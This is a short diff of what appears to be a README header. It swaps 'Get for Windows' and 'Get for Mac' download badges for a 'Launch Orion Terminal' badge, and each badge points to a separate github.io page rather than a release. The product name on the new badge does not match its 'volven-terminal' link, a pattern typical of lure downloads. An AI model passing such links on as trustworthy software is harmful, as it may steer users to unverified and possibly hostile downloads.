@@ -6,10 +6,7 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://cohenvelezxlsw.github.io/.github/Volven-Terminal)  
-
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://cohenvelezxlsw.github.io/.github/Volven-Terminal)
-</div>
+[![Launch Orion Terminal](https://img.shields.io/badge/Launch-Orion%20Terminal-1D4ED8?style=flat-square)](https://premier-volven-terminal.github.io/.github/)
 
 ---
 
